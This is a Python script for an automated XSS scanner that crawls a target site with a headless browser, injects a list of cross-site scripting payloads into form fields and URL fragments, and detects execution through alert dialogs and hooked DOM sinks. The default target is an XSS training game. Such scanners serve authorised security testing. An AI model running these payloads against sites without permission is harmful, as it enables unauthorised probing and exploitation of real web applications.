#!/usr/bin/env python3
import time
import logging
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError

from rich.logging import RichHandler
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, MofNCompleteColumn

# ==========================================
# CONFIGURATION (Headless Engine Settings)
# ==========================================
TARGET_URL = "https://xss-game.appspot.com/level4/frame"  # Replace with your target
HEADLESS_MODE = True                       # Set to False to watch the browser work
VERBOSE_LOGGING = True
TIMEOUT_MS = 5000                          # 5 seconds max per page load
# ==========================================

# Modern payloads designed to break out of attributes, tags, and JS string concatenations
PAYLOADS = [
    '"><script>alert("XSS_VULN")</script>',
    '"><svg onload=alert("XSS_VULN")>',
    'javascript:alert("XSS_VULN")',
    '<img src="x" onerror="alert(\'XSS_VULN\')">',
    '<svg onload="alert(\'XSS_VULN\')">',
    '\' onerror=\'alert("XSS_VULN")\'',
    '" onerror="alert(\'XSS_VULN\')"'
]

logger = logging.getLogger("XssPro")
handler = RichHandler(rich_tracebacks=True, markup=True)
logger.addHandler(handler)
logger.setLevel(logging.DEBUG if VERBOSE_LOGGING else logging.INFO)

class HeadlessScanner:
    def __init__(self, start_url):
        self.start_url = start_url
        self.domain = urlparse(start_url).netloc
        self.visited_links = set()
        self.links_to_visit = set([start_url])
        self.vulnerabilities = []
        # STATEFUL REGISTRY: Prevents infinite loop terminal spam from JS re-renders
        self.seen_vulns = set()

    def extract_links(self, page, current_url):
        """Scrapes all same-domain links from the current page."""
        try:
            hrefs = page.eval_on_selector_all("a[href]", "elements => elements.map(e => e.href)")
            for href in hrefs:
                if href and self.domain in urlparse(href).netloc and href not in self.visited_links:
                    if not any(href.lower().endswith(ext) for ext in ['.png', '.jpg', '.pdf', '.css', '.js']):
                        self.links_to_visit.add(href)
        except Exception as e:
            logger.debug(f"Failed to extract links: {e}")

    def test_url_fragments(self, page, url):
        """Tests for DOM-based XSS by injecting payloads into the URL hash."""
        logger.info(f"Testing URL parameters and fragments on {url}...")
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload in PAYLOADS:
            test_url = f"{base_url}#{payload}"
            logger.debug(f"Testing URL payload: {test_url}")
            try:
                page.goto(test_url, timeout=TIMEOUT_MS)
                # Wait for the client-side JavaScript to process the hash and render the DOM
                page.wait_for_timeout(1500)
            except PlaywrightTimeoutError:
                pass
            except Exception as e:
                logger.debug(f"URL testing error on {url}: {e}")

    def test_forms(self, page, url):
        """Finds inputs/textareas, injects payloads, and handles robust form submission."""
        try:
            # Catch all text inputs and textareas, ignoring buttons and hidden fields
            locator_string = "input:not([type='submit']):not([type='button']):not([type='hidden']), textarea"
            inputs = page.locator(locator_string).all()
            
            if not inputs:
                return

            logger.info(f"Found {len(inputs)} input(s) on {url}. Commencing payload injection.")
            
            for index in range(len(inputs)):
                for payload in PAYLOADS:
                    try:
                        current_input = page.locator(locator_string).nth(index)
                        input_name = current_input.get_attribute("name") or current_input.get_attribute("id") or f"Input_{index}"
                        
                        logger.debug(f"Injecting payload into '{input_name}'")
                        current_input.clear()
                        current_input.fill(payload)
                        
                        # Robust form submission logic
                        try:
                            with page.expect_navigation(timeout=TIMEOUT_MS):
                                form = current_input.locator("xpath=ancestor::form")
                                if form.count() > 0:
                                    submit_btn = form.locator("button, input[type='submit']").first
                                    if submit_btn.count() > 0:
                                        submit_btn.click()
                                    else:
                                        current_input.press("Enter")
                                else:
                                    current_input.press("Enter")
                        except PlaywrightTimeoutError:
                            pass
                            
                        # Wait for asynchronous DOM events (like image load failures)
                        page.wait_for_timeout(1500) 
                        
                    except Exception as e:
                        logger.debug(f"Input injection failed: {e}")
                        
                    try:
                        page.goto(url, timeout=TIMEOUT_MS)
                    except PlaywrightTimeoutError:
                        pass
                        
        except Exception as e:
            logger.error(f"Form testing error on {url}: {e}")

    def run(self):
        logger.info(f"Initializing Headless Browser Engine for target: {self.start_url}")
        
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=HEADLESS_MODE)
            context = browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
            )
            page = context.new_page()

            # ---------------------------------------------------------
            # VULNERABILITY LISTENERS: Deduplicated Alerts and Sink Hooks
            # ---------------------------------------------------------
            def handle_dialog(dialog):
                """Catches standard alert() executions."""
                if "XSS_VULN" in dialog.message:
                    vuln_sig = f"DIALOG_{page.url}"
                    if vuln_sig not in self.seen_vulns:
                        self.seen_vulns.add(vuln_sig)
                        vuln_report = f"[bold red]CONFIRMED XSS on {page.url} | Type: {dialog.type}[/]"
                        logger.critical(vuln_report)
                        self.vulnerabilities.append(vuln_report)
                dialog.accept()

            def handle_console(msg):
                """Catches execution in JS sinks even if alert() fails or is blocked."""
                if "[SINK_HIT]" in msg.text:
                    vuln_sig = f"SINK_{page.url}_{msg.text}"
                    if vuln_sig not in self.seen_vulns:
                        self.seen_vulns.add(vuln_sig)
                        vuln_report = f"[bold red]DOM XSS SINK HIT on {page.url} | Details: {msg.text}[/]"
                        logger.critical(vuln_report)
                        self.vulnerabilities.append(vuln_report)

            page.on("dialog", handle_dialog)
            page.on("console", handle_console)

            # Inject Monkey-Patches for DOM Sinks
            sink_hook_script = """
                const originalInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
                Object.defineProperty(Element.prototype, 'innerHTML', {
                    set: function(val) {
                        if (typeof val === 'string' && val.includes("XSS_VULN")) {
                            console.error("[SINK_HIT] innerHTML overridden with payload: " + val);
                        }
                        originalInnerHTML.set.call(this, val);
                    }
                });

                const originalDocWrite = document.write;
                document.write = function(val) {
                    if (typeof val === 'string' && val.includes("XSS_VULN")) {
                        console.error("[SINK_HIT] document.write overridden with payload: " + val);
                    }
                    originalDocWrite.apply(this, arguments);
                };

                const originalEval = window.eval;
                window.eval = function(val) {
                    if (typeof val === 'string' && val.includes("XSS_VULN")) {
                        console.error("[SINK_HIT] eval() overridden with payload: " + val);
                    }
                    return originalEval.apply(this, arguments);
                };
            """
            page.add_init_script(sink_hook_script)

            # ---------------------------------------------------------
            # CRAWL AND ATTACK LOOP
            # ---------------------------------------------------------
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                MofNCompleteColumn(),
                transient=True
            ) as progress:
                
                scan_task = progress.add_task("[cyan]Scanning target...", total=1)

                while self.links_to_visit:
                    current_url = self.links_to_visit.pop()
                    self.visited_links.add(current_url)
                    
                    total_discovered = len(self.visited_links) + len(self.links_to_visit)
                    progress.update(scan_task, total=total_discovered)
                    
                    logger.info(f"Navigating to: {current_url}")
                    try:
                        page.goto(current_url, timeout=TIMEOUT_MS)
                        time.sleep(1) 
                        
                        self.extract_links(page, current_url)
                        self.test_forms(page, current_url)
                        self.test_url_fragments(page, current_url)
                        
                    except PlaywrightTimeoutError:
                        logger.warning(f"Timeout while loading {current_url}")
                    except Exception as e:
                        logger.error(f"Failed to process {current_url}: {e}")
                    
                    progress.advance(scan_task)

            browser.close()

        # Final Reporting
        logger.info("SCAN COMPLETE")
        logger.info(f"Total pages scanned: {len(self.visited_links)}")
        if self.vulnerabilities:
            logger.critical(f"Total Validated Vulnerabilities: {len(self.vulnerabilities)}")
        else:
            logger.info("No executable XSS vulnerabilities found.")

if __name__ == "__main__":
    if not TARGET_URL:
        logger.error("Please configure the TARGET_URL at the top of the script.")
        exit(1)
        
    scanner = HeadlessScanner(TARGET_URL)
    scanner.run()
